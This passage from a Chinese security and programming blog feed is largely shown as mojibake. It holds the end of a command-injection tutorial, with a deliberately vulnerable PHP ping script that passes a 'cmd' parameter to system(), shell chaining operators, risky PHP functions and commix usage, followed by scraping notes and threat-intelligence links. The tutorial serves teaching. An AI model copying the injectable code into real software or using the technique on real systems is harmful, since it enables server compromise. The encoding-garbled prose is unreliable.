ï¼Œå¯¹æŒ‡å®šç›®æ ‡æ‰§è¡Œ ping å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;</span><br><span class="line">$arg = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if($arg)&#123;</span><br><span class="line">system(&quot;ping -c 4 $arg&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Linux ä¸‹çš„ ping å‘½ä»¤ä¸ Windows ä¸‹çš„ ping å‘½ä»¤çš„åŒºåˆ«ï¼š</p><p>Linux çš„ ping é»˜è®¤ä¸€ç›´æ‰§è¡Œã€‚éœ€è¦åŠ ä¸Š -c 4 æŒ‡å®šæ‰§è¡Œå‚æ•°ä¸º 4æ¬¡ï¼Œæ‰ä¼šåªæ‰§è¡Œ 4 æ¬¡</p><p>Windows ä¸‹çš„ ping é»˜è®¤æ‰§è¡Œ 4 æ¬¡</p><p>kali linux é›†æˆäº† Apache2 å’Œ Nginx</p><p>apache çš„ç½‘ç«™æ ¹ç›®å½•ä¸º <code>/var/www/html/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 status#æŸ¥çœ‹ apache2 æœåŠ¡å½“å‰çŠ¶æ€</span><br><span class="line">service apache2 start# å¼€å¯ apache2 æœåŠ¡</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´æ‹¼æ¥ç¬¦ä»‹ç»">å‘½ä»¤æ‰§è¡Œæ¼æ´æ‹¼æ¥ç¬¦ä»‹ç»</h3><p>åœ¨ Linux ç³»ç»Ÿä¸‹çš„ shell å‘½ä»¤ä¸­ï¼Œæœ‰ä»¥ä¸‹ä¸€äº›æˆªæ–­æ‹¼æ¥ç¬¦</p><p><code>;</code> ï¼š å‰é¢çš„æ‰§è¡Œå®Œï¼Œæ‰§è¡Œåé¢çš„ --&gt; åˆ†éš”ç¬¦</p><p><code>|</code> ï¼šç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ</p><p><code>&amp;</code>: æ— è®ºå‰é¢è¯­å¥çœŸå‡éƒ½ä¼šæ‰§è¡Œ</p><p><code>&amp;&amp;</code>: åªæœ‰å‰é¢è¯­å¥ä¸ºçœŸï¼Œæ‰ä¼šæ‰§è¡Œåé¢è¯­å¥ ---&gt;é€»è¾‘ä¸</p><p><code>||</code>ï¼š å½“å‰é¢çš„æ‰§è¡Œé”™è¯¯æ—¶ï¼Œæ‰§è¡Œåé¢çš„ --&gt; é€»è¾‘æˆ–</p><p>åœ¨ Linux ä¸Šï¼Œä¸Šé¢çš„ <code>;</code> ä¹Ÿå¯ä»¥ç”¨ <code>|</code>ï¼Œ<code>||</code> ä»£æ›¿ã€‚</p><h1 id="ä»£ç æ‰§è¡Œæ¼æ´">ä»£ç æ‰§è¡Œæ¼æ´</h1><p>åœ¨ PHP ä¸‹å…è®¸å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br></pre></td></tr></table></figure><p>å¦‚æœé¡µé¢ä¸­å­˜åœ¨è¿™äº›å‡½æ•°å¹¶ä¸”å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšä¸¥æ ¼çš„è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><p>å…¶ä»–å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ob_start()ã€unserialize()ã€create_function()</span><br><span class="line">usort()ã€uasort()ã€uksort()</span><br><span class="line">arrayâ€”_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œç»• WAF æŠ€å·§ï¼š</p><h1 id="å‘½ä»¤æ‰§è¡Œè‡ªåŠ¨åŒ–å·¥å…·">å‘½ä»¤æ‰§è¡Œè‡ªåŠ¨åŒ–å·¥å…·</h1><h2 id="commix-å·¥å…·ä»‹ç»">commix å·¥å…·ä»‹ç»</h2><p>Commix æ˜¯ä¸€ä¸ªä½¿ç”¨ Pythonå¼€å‘çš„æ¼æ´æµ‹è¯•å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·æ˜¯ä¸ºäº†æ–¹ä¾¿çš„æ£€æµ‹ä¸€ä¸ªè¯·æ±‚æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå¹¶ä¸”å¯¹å…¶è¿›è¡Œæµ‹è¯•ï¼Œåœ¨å…¶ä½œè€…å‘å¸ƒçš„æœ€æ–°ç‰ˆæœ¬ä¸­æ”¯æŒç›´æ¥å¯¼å…¥Burp çš„å†å²è®°å½•è¿›è¡Œæ£€æµ‹ï¼Œå¤§å¤§æé«˜äº†æ˜“ç”¨æ€§ã€‚</p><p>commix github</p><p>kali linux è‡ªå¸¦äº† commixï¼Œ å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commix -h# æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</span><br><span class="line">commix -u ï½›urlï½# å³å¯æ£€æµ‹ï¼Œç„¶åä¼šæç¤ºä½ æ˜¯å¦æ¨¡æ‹Ÿ shellï¼Œç›´æ¥æ¨¡æ‹Ÿå‡ºæ¥ä¸€ä¸ª shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> cmd_execution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬è™«åŸºç¡€</title>
      <link href="/blog/2019/09/15/programming/python/spider_basic/"/>
      <url>/blog/2019/09/15/programming/python/spider_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="http-å¸¸è§è¯·æ±‚å¤´">HTTP å¸¸è§è¯·æ±‚å¤´</h2><ul><li><p>Hostï¼ˆä¸»æœºå’Œç«¯å£å·ï¼‰</p></li><li><p>Connectionï¼ˆé“¾æ¥ç±»å‹ï¼‰</p></li><li><p>Upgrade-Insecure-Requestsï¼ˆå€¼ä¸º 1 ï¼Œåˆ™å‡çº§ä¸º HTTPSè¯·æ±‚ï¼‰</p></li><li><p><strong>User-Agentï¼ˆæµè§ˆå™¨åç§°ï¼‰</strong></p></li><li><p>Acceptï¼ˆä¼ è¾“æ–‡ä»¶ç±»å‹ï¼‰</p></li><li><p>Refererï¼ˆé¡µé¢è·³è½¬å¤„ï¼‰</p></li><li><p>Accept-Encodingï¼ˆæ–‡ä»¶ç¼–è§£ç æ ¼å¼ï¼‰</p></li><li><p><strong>Cookie ï¼ˆCookieï¼‰</strong></p></li><li><p>X-requested-with: XMLHttpRequestï¼ˆæ˜¯ Ajax å¼‚æ­¥è¯·æ±‚ï¼‰</p></li><li><p>X-forward-for: ip0 ip1 ip2 è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IP ä¸ºip0**</p></li><li><p>Remote Address: æœ€ç»ˆè¯·æ±‚æœåŠ¡å™¨åœ°å€</p></li><li><p>Aceeptï¼šå¤šç§ç±»å‹ï¼Œæ¯ä¸€ç§/å‡ ç§ç±»å‹åé¢çš„ qæ˜¯æƒé‡çš„æ„æ€ï¼Œæƒé‡å¤§ï¼Œä¼˜å…ˆçº§é«˜</p></li></ul><p>requests æ¨¡å—åœ¨ Python 2 å’Œ Python 3 ä¸­éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤ä¸ç”¨æ‹…å¿ƒã€‚</p><h2 id="user-agent">User-Agent</h2><ol type="1"><li>å¯ä»¥åœ¨ chrome çš„å¼€å‘è€…å·¥å…·ä¸­ï¼Œæ›´æ”¹ä¸ºå„ç§æ‰‹æœºçš„UAã€‚æœ‰æ—¶å€™ç”µè„‘ç‰ˆçš„ç½‘é¡µçš„ä¸€äº›åœ°å€ã€post æ•°æ®å‘å‘çš„ URLä¸å¥½æ‰¾æˆ–åŠ å¯†ç¹æ‚æœ‰æ—¶é—´æˆ³ç­‰ï¼Œå¯ä»¥åˆ‡æ¢åˆ°æ‰‹æœºç‰ˆçœ‹çœ‹ï¼Œå¾€å¾€æœ‰æƒŠå–œå“¦ã€‚</li><li>å¯ä»¥é€šè¿‡åˆ‡æ¢ UA æ¥é™ä½è¢«è¯†åˆ«ä¸ºçˆ¬è™«çš„å‡ ç‡</li></ol><h2 id="cookie-ä¸-seesion">Cookie ä¸ Seesion</h2><p>cookieä¿å­˜åœ¨æµè§ˆå™¨æœ¬åœ°ï¼Œç”¨æˆ·/æœ¬åœ°å¯ä»¥ä¿®æ”¹å…¶å†…å®¹ã€‚å› ä¸ºå®ƒæ˜¯ä¿å­˜åœ¨æœ¬åœ°çš„ï¼Œæ‰€ä»¥å®ƒçš„å¤§å°æ˜¯æœ‰ä¸Šé™çš„</p><p>seesionä¹Ÿä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨æˆ·/æœ¬åœ°æ— æ³•æ›´æ”¹å…¶å†…å®¹ã€‚å› ä¸ºå®ƒæ˜¯ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šé¢çš„ï¼Œæ‰€ä»¥å®ƒçš„å¤§å°å–å†³äºæœåŠ¡å™¨å¤§å°ã€‚</p><h2 id="å­—ç¬¦ä¸²åŒºåˆ«ä¸è½¬åŒ–">å­—ç¬¦ä¸²åŒºåˆ«ä¸è½¬åŒ–</h2><p>Python 3 ä¸­å­—ç¬¦ä¸²åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ç±»å‹ï¼šstr ç±»å‹å’Œ bytes ç±»å‹</p><p>bytes ç±»å‹ï¼š<strong>äºŒè¿›åˆ¶</strong></p><ul><li>äº’è”ç½‘ä¸Šçš„æ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼æ¥ä¼ è¾“çš„</li></ul><p>str ç±»å‹ï¼šunicode çš„å‘ˆç°å½¢å¼</p><p>ç¼–ç æ–¹å¼è§£ç æ–¹å¼å¿…é¡»ä¸€æ ·ï¼Œå¦åˆ™å°±ä¼šå‡ºç°ä¹±ç </p><h2 id="å­—ç¬¦ç¼–ç ç®€å•å›é¡¾">å­—ç¬¦ç¼–ç ç®€å•å›é¡¾</h2><p><strong>Unicode UTF8 ASCII çš„è¡¥å……</strong> å­—ç¬¦é›†åŒ…æ‹¬ï¼šASCIå­—ç¬¦é›†ã€GB2312 å­—ç¬¦é›†ã€GB18030 å­—ç¬¦é›†ã€Unicode å­—ç¬¦é›†ç­‰ ASCll ç¼–ç æ˜¯ 1ä¸ªå­—èŠ‚ï¼Œè€Œ Unicode ç¼–ç <strong>é€šå¸¸</strong>æ˜¯ 2 ä¸ªå­—èŠ‚ã€‚ UTF-8 æ˜¯Unicode çš„å®ç°æ–¹å¼ä¹‹ä¸€ï¼ŒUTF-8 æ˜¯å®ƒæ˜¯ä¸€ç§å˜é•¿çš„ç¼–ç æ–¹å¼ï¼Œå¯ä»¥æ˜¯ 1ï¼Œ2ï¼Œ3ä¸ª å­—èŠ‚</p><h1 id="çˆ¬è™«çš„å®šä¹‰">çˆ¬è™«çš„å®šä¹‰</h1><p>ç½‘ç»œçˆ¬è™«ï¼ˆåˆè¢«ç§°ä¸ºç½‘é¡µèœ˜è››ï¼Œç½‘ç»œæœºå™¨äººï¼‰å°±æ˜¯æ¨¡æ‹Ÿå®¢æˆ·ç«¯å‘é€ç½‘ç»œè¯·æ±‚ï¼Œæ¥æ”¶è¯·æ±‚å“åº”ï¼Œä¸€ç§æŒ‰ç…§ä¸€å®šçš„è§„åˆ™ï¼Œè‡ªåŠ¨åœ°æŠ“å–äº’è”ç½‘ä¿¡æ¯çš„ç¨‹åºã€‚<strong>åªè¦æ˜¯æµè§ˆå™¨èƒ½åšçš„äº‹æƒ…ï¼ŒåŸåˆ™ä¸Šï¼Œçˆ¬è™«éƒ½èƒ½å¤Ÿåš</strong></p><p>è¦çˆ¬å–ä¸€ä¸ªç½‘ç«™çš„æ•°æ®ï¼Œä¸ä¸€å®šè¦ç¡¬æ€¼è¿™ä¸ªç½‘ç«™æœ¬èº«ã€‚æˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ¸ é“ï¼š</p><ol type="1"><li>æ”¹æ¢ UAï¼Œæ‰‹æœºç‰ˆç­‰</li><li>å»ä¸è¯¥ç½‘ç«™æœ‰åˆä½œçš„ç½‘ç«™ï¼Œè¿‚å›æ“ä½œ</li></ol><h1 id="çˆ¬è™«åˆ†ç±»">çˆ¬è™«åˆ†ç±»</h1><ol type="1"><li>é€šç”¨çˆ¬è™«ï¼šé€šç”¨çˆ¬è™«æ˜¯æœç´¢å¼•æ“æŠ“å–ç³»ç»Ÿï¼ˆç™¾åº¦ã€è°·æ­Œã€æœç‹—ç­‰ï¼‰çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ä¸»è¦æ˜¯å°†äº’è”ç½‘ä¸Šçš„ç½‘é¡µä¸‹è½½åˆ°æœ¬åœ°ï¼Œå½¢æˆä¸€ä¸ªäº’è”ç½‘å†…å®¹çš„é•œåƒå¤‡ä»½ã€‚</li><li>èšç„¦çˆ¬è™«ï¼šæ˜¯é¢å‘<strong>ç‰¹å®šéœ€æ±‚</strong>çš„ä¸€ç§ç½‘ç»œçˆ¬è™«ç¨‹åºï¼Œä»–ä¸é€šç”¨çˆ¬è™«çš„åŒºåˆ«åœ¨äºï¼šèšç„¦çˆ¬è™«åœ¨å®æ–½ç½‘é¡µæŠ“å–çš„æ—¶å€™ä¼šå¯¹å†…å®¹è¿›è¡Œç­›é€‰å’Œå¤„ç†ï¼Œå°½é‡ä¿è¯åªæŠ“å–ä¸éœ€æ±‚ç›¸å…³çš„ç½‘é¡µä¿¡æ¯ã€‚</li></ol><h1 id="é€šç”¨æœç´¢å¼•æ“çš„å·¥ä½œåŸç†">é€šç”¨æœç´¢å¼•æ“çš„å·¥ä½œåŸç†</h1><h2 id="æœç´¢å¼•æ“çš„æµç¨‹">æœç´¢å¼•æ“çš„æµç¨‹</h2><p>æŠ“å–ç½‘é¡µ ----&gt; æ•°æ®å­˜å‚¨ ----&gt; é¢„å¤„ç† ----&gt;æä¾›æ£€ç´¢æœåŠ¡ã€ç½‘ç«™æ’åï¼ˆç‚¹å‡»ç‡ï¼Œå¼•ç”¨æ¬¡æ•°ç­‰ï¼‰</p><p>ç§å­ URL åœ°å€ä¸ä¸€å®šæ˜¯ç½‘ä¸Šçš„æ‰€æœ‰ URL åœ°å€ï¼Œåªè¦é€šè¿‡æŸä¸ª URLçš„å“åº”å†…å®¹ä¸­çš„ URL å¯ä»¥è¾¾åˆ°å°±è¡Œ</p><p>æœç´¢å¼•æ“æ’åç®—æ³•ï¼šPageRank ç®—æ³•</p><p>äº¤æ¢å‹é“¾ä»¥åŠè¦æ±‚åœ¨æ–‡ç« æˆ–ç½‘ç«™ä¸­æ”¾é“¾æ¥çš„ç›®çš„ï¼š</p><p>ä¸ºäº†å¢åŠ ç½‘ç«™æˆ–æ–‡ç« è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼Œå½“ç™¾åº¦å¼•æ“è·å–ä¸€ä¸ªç½‘é¡µå†…å®¹æ—¶ï¼Œä¹Ÿå¯ä»¥è·å–é‡Œé¢çš„URLï¼Œä»è€Œæé«˜é‡Œé¢ URLçš„æ›å…‰ç‡ã€‚è€Œä¸”å¦‚æœæ–‡ç« ç­‰è¢«æƒé‡å¤§çš„ç½‘ç«™å¼•ç”¨ï¼Œé‚£ä¹ˆæ•ˆæœæ›´å¥½ã€‚</p><h3 id="robots-åè®®">robots åè®®</h3><p>robotsåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œè€Œåªæ˜¯çº¦å®šä¿—æˆçš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ä¿è¯ç½‘ç«™çš„éšç§ã€‚</p><p>robots åè®®ä¹Ÿå« robots.txtï¼ˆç»Ÿä¸€å°å†™ï¼‰æ˜¯ä¸€ç§å­˜æ”¾äºç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ASCIIç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé€šå¸¸å‘Šè¯‰ç½‘ç»œæœç´¢å¼•æ“çš„çˆ¬è™«ï¼Œæ­¤ç½‘ç«™ä¸­çš„å“ªäº›å†…å®¹æ˜¯ä¸åº”è¢«æœç´¢å¼•æ“çš„çˆ¬è™«è·å–çš„ï¼Œå“ªäº›æ˜¯å¯ä»¥è¢«çˆ¬è™«è·å–çš„ã€‚</p><h1 id="èšç„¦çˆ¬è™«">èšç„¦çˆ¬è™«</h1><p>URL List ----&gt; å“åº”å†…å®¹ï¼ˆæ ¹æ®å“åº”å†…å®¹æå– URL ï¼Œæ”¾å…¥ URL Listå†æ¬¡æå–ï¼‰ ----&gt; æå–æ•°æ® ----&gt; å…¥åº“</p><p>åœ¨ç›¸åº”å†…å®¹ä¸­æå– URLï¼Œ å¯ä»¥ä½¿ç”¨</p><ul><li><p>ä¸‹ä¸€é¡µå¤„è·å– URLï¼Œç›´åˆ°æ²¡æœ‰ä¸‹ä¸€é¡µ</p></li><li><p>è¯¦æƒ…å¤„æå– URL</p></li></ul><p>å­¦ä¹ è§„åˆ’ï¼š</p><p>åŸºç¡€çŸ¥è¯† ----&gt; requests ä½¿ç”¨ ----&gt; æ•°æ®æå–æ–¹æ³• ----&gt;åŠ¨æ€ç½‘é¡µæå–æ•°æ® ----&gt; scrapy ----&gt; scrapy redis</p><p><strong>æµè§ˆå™¨æ¸²æŸ“å‡ºæ¥çš„é¡µé¢å’Œçˆ¬è™«è¯·æ±‚çš„é¡µé¢å¹¶ä¸ä¸€æ ·çš„ã€‚</strong></p><p>çˆ¬è™«è¯·æ±‚çš„åªæœ‰ HTMLï¼Œè€Œæµè§ˆå™¨ä¼šæ ¹æ® html ä¸­çš„jsï¼Œå›¾ç‰‡ç­‰åœ°å€ï¼Œè¯·æ±‚å›¾ç‰‡ï¼Œcss ç­‰ï¼ŒåŒæ—¶ jsè¿˜ä¼šåŠ¨æ€æ”¹å˜é¡µé¢ï¼Œæœ€ç»ˆæ¸²æŸ“å‡ºé¡µé¢ã€‚</p><p>Chrome ä¸­çš„ Elements ä¸ Network ä¸­çš„ Repsonse</p><p>network ä¸­çš„ response åªæ˜¯çº¯çš„ HTMLï¼Œè€Œ Elements æ˜¯åŒ…å« CSS, JS,å›¾ç‰‡ä»¥åŠå½“å‰ URL åœ°å€çš„å“åº”ï¼ˆresponseï¼‰çš„ï¼Œè€Œå½“å‰é¡µé¢å¯èƒ½ä¼šé€šè¿‡ JSï¼ŒAjax åŠ¨æ€ç”Ÿæˆã€æ”¹å˜ç½‘é¡µå†…å®¹ã€‚</p><p>æˆ‘ä»¬åœ¨åç»­çˆ¬è™«æ—¶ï¼Œè¦ä»¥å½“å‰ URL åœ°å€å¯¹åº”çš„å“åº” responseä¸ºå‡†ï¼Œå¦‚æœæœ‰ä¸€å¤©æˆ‘ä»¬æ ¹æ®å½“å‰ URLåœ°å€å¯¹åº”çš„å“åº”ï¼Œæ‹¿ä¸åˆ°æ•°æ®ï¼Œé‚£å¯èƒ½åœ¨å…¶ä»– URL çš„å“åº”é‡Œé¢æˆ–è€…æ˜¯é€šè¿‡ JSç”Ÿæˆçš„ã€‚</p><p>çˆ¬è™«çš„æ—¶å€™æˆ‘ä»¬è¦ç¡®å®š URLä¸­çš„å‚æ•°å“ªäº›æ˜¯æœ‰ç”¨çš„ï¼Œå“ªäº›æ˜¯æ²¡ç”¨çš„ï¼Œæœ‰ç”¨çš„å‚æ•°ä¼šä¸ä¼šå˜ï¼Œå¦‚æœå˜ï¼Œé‚£å…¶è§„å¾‹æ˜¯ä»€ä¹ˆ</p><h2 id="user-agents-of-spiders">User-Agents of spiders</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Baidu spider</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"></span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¨èƒæƒ…æŠ¥</title>
      <link href="/blog/2019/09/13/misc/threat_intellig/"/>
      <url>/blog/2019/09/13/misc/threat_intellig/</url>
      
        <content type="html"><![CDATA[<h1 id="å¨èƒæƒ…æŠ¥ç°çŠ¶ä¸æœªæ¥å‘å±•">å¨èƒæƒ…æŠ¥ç°çŠ¶ä¸æœªæ¥å‘å±•</h1><ul><li><p><ahref="https://www.freebuf.com/news/137830.html">å¨èƒæƒ…æŠ¥çš„å‰ä¸–ä»Šç”Ÿ</a></p></li><li><p><ahref="https://finsec.pingan.com/Article/detail/803">ã€Šå¨èƒæƒ…æŠ¥æŠ€æœ¯åº”ç”¨åŠå‘å±•åˆ†æè“çš®ä¹¦ã€‹â€”â€”èšç„¦æ”»é˜²ï¼Œæƒ…æŠ¥é©±åŠ¨ï¼Œå…¨é¢å‡çº§å®‰å…¨è¿è¥</a></p><p>æœ¬æ–‡çœ‹ å¨èƒæƒ…æŠ¥æ¦‚è¿°ã€å¨èƒæƒ…æŠ¥çš„å†å²åŠç°çŠ¶ï¼Œå¨èƒæƒ…æŠ¥è§„æ¨¡ä¸‰ä¸ªéƒ¨åˆ†å°±è¡Œï¼Œåé¢æ²¡å•¥çœ‹çš„æ„Ÿè§‰ã€‚</p></li><li><p><ahref="https://zhuanlan.zhihu.com/p/29685186">å¨èƒæƒ…æŠ¥çœŸçš„æ˜¯ç½‘ç»œå®‰å…¨çš„â€œå°‘æ•°æ´¾æŠ¥å‘Šâ€œä¹ˆï¼Ÿ</a></p><p>æŒ‰é˜¶æ®µè®²è¿°äº†å¨èƒæƒ…æŠ¥çš„å‘å±•ä»¥åŠå½“å‰çš„ç°çŠ¶ã€‚</p><p>èŠ‚é€‰</p></li></ul><blockquote><p>æ­£å› ä¸ºå¨èƒæƒ…æŠ¥çš„æ½œåŠ›æ— é™ï¼Œæ‰€ä»¥ä¿¡æ¯å®‰å…¨è¡Œä¸šçœŸçš„å¾ˆéœ€è¦å¾ˆå¤šç²¾é€šæ•°æ®æŒ–æ˜æŠ€æœ¯å’Œæœºå™¨å­¦ä¹ æŠ€æœ¯çš„æ‡‚å®‰å…¨çš„å·¥ç¨‹å¸ˆåŠ å…¥åˆ°è¿™ä¸ªè¡Œä¸šä¸­æ¥ï¼Œç›¸ä¿¡å¨èƒæƒ…æŠ¥çš„æœªæ¥ä¸€ç‰‡å…‰æ˜ã€‚</p><p>ä½†æ˜¯è¯è™½è¿™ä¹ˆè¯´ï¼Œä¸€å®šè¦æ³¨æ„å¨èƒæƒ…æŠ¥åªèƒ½ç”¨æ¥è¾…åŠ©å†³ç­–ï¼Œä¸èƒ½ç”¨æ¥ç›´æ¥å†³ç­–ï¼Œæ‰€ä»¥ç°åœ¨ä¸€èˆ¬è¯´å¨èƒæƒ…æŠ¥å¯ä»¥ç”¨æ¥é¢„æµ‹æ”»å‡»çš„åŸºæœ¬ä¸Šéƒ½æ˜¯xxxã€‚ä¸å…¶ä»–çš„æŠ€æœ¯ç›¸ç»“åˆå¯ä»¥ä½¿å¨èƒæƒ…æŠ¥çš„ä½œç”¨æœ€å¤§åŒ–ï¼Œè¯¸å¦‚äº’è”ç½‘æ”»å‡»æº¯æºã€ç”¨æˆ·å®ä½“è¡Œä¸ºåˆ†æï¼ˆUEBAï¼‰ã€äº‹ä»¶è°ƒæŸ¥ä¸å–è¯ç­‰æŠ€æœ¯ç»“åˆå¨èƒæƒ…æŠ¥å¾€å¾€ä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„ç»“æœã€‚</p></blockquote><ul><li><p><a href="https://www.freebuf.com/articles/system/98790.html">ä»RSA çƒ­è¯çœ‹å¨èƒæƒ…æŠ¥åœ¨ NGFW ä¸Šçš„è½åœ°</a></p></li><li><p><ahref="https://www.sec-un.org/rsa2017å…¨é¢è§£è¯»-å®‰å…¨å‚å®¶ä¹‹å¨èƒæƒ…æŠ¥/">RSA2017å…¨é¢è§£è¯»-å®‰å…¨å‚å®¶ä¹‹å¨èƒæƒ…æŠ¥</a></p><p>æœ¬æ–‡è®²è§£çš„å½“å‰å±€åŠ¿å’Œæœªæ¥å‘å±•éƒ½æŒºå¥½çš„</p></li></ul><blockquote><p>A next-generation firewall (NGFW) is a part of the third generationof firewall technology, combining a traditional firewall with othernetwork device filtering functionalities --wikipedia</p><p>ä¸‹ä¸€ä»£é˜²ç«å¢™æ˜¯ç¬¬ä¸‰ä»£é˜²ç«å¢™æŠ€æœ¯çš„ä¸€éƒ¨åˆ†ã€‚å®ƒå°†ä¼ ç»Ÿçš„é˜²ç«å¢™æŠ€æœ¯ä¸å…¶ä»–å…·å¤‡è¿‡æ»¤åŠŸèƒ½çš„ç½‘ç»œè®¾æ–½ç»“åˆèµ·æ¥ã€‚</p></blockquote><p>æˆ‘æŸ¥ç€ä» RSA 2014 å°±æœ‰ threat intelligence è¿™ä¸ªæ¦‚å¿µäº†ï¼Œç„¶å RSA2015ã€2016ã€2017 é€æ¸ç«çˆ†ã€æˆç†Ÿï¼ˆ2013 å’Œ 2018 æ²¡æŸ¥ emmï¼‰ï¼Œ2019å¨èƒæƒ…æŠ¥ä¾æ—§æ˜¯ RSA è®¨è®ºçš„ä¸€ä¸ªçƒ­ç‚¹ã€‚</p><p><a href="https://www.rsaconference.com/usa/2019">RSA 2019</a>æƒ³çœ‹å“ªä¸€å¹´ï¼Œå°±æŠŠé“¾æ¥æœ«å°¾çš„æ•°å­—æ”¹ä¸€ä¸‹å°±è¡Œäº†ã€‚</p><h1 id="å¨èƒæƒ…æŠ¥çš„åˆ†ç±»">å¨èƒæƒ…æŠ¥çš„åˆ†ç±»</h1><p>æ ¹æ®ç”Ÿæˆçš„æƒ…æŠ¥çš„ä¼˜å…ˆçº§åˆ†ç±»ï¼š</p><p><ahref="https://xuj.me/threat_intelligence/sec-threat-intelli/#%E6%83%85%E6%8A%A5%E6%8C%89%E4%BC%98%E5%85%88%E7%BA%A7%E5%88%86%E7%B1%BB">æƒ…æŠ¥çš„åˆ†ç±»</a></p><p>æ ¹æ®æƒ…æŠ¥çš„ä¿¡æ¯æ¥æºåˆ†ç±»ï¼š</p><p><ahref="https://xuj.me/threat_intelligence/sec-threat-intelli/#%E5%AE%89%E5%85%A8%E6%83%85%E6%8A%A5%E5%88%86%E7%B1%BB">å®‰å…¨æƒ…æŠ¥åˆ†ç±»</a></p><h1 id="å¨èƒæƒ…æŠ¥æµç¨‹">å¨èƒæƒ…æŠ¥æµç¨‹</h1><p>å¨èƒæµç¨‹ä¸»è¦é€‰è‡ª <ahref="https://www.secpulse.com/archives/96022.html">å®‰å…¨å°è¯¾å ‚ç¬¬ 128æœŸã€ç”²æ–¹å¨èƒæƒ…æŠ¥ç”Ÿå­˜æŒ‡å—ã€‘</a></p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼š<strong>æºæ•°æ® â€“&gt; è‡ªåŠ¨åŒ–åˆ†æ â€“&gt;å¨èƒæƒ…æŠ¥</strong></p><p>é™„ä¸Šä¸€å¼ æ¥è‡ªå®‰å…¨ç‰›çš„å›¾</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/ti_process2.png" /></p><p>ç¨å¾®å†è¯¦ç»†ç‚¹ï¼š</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/ti_process.jpg" /></p><h2 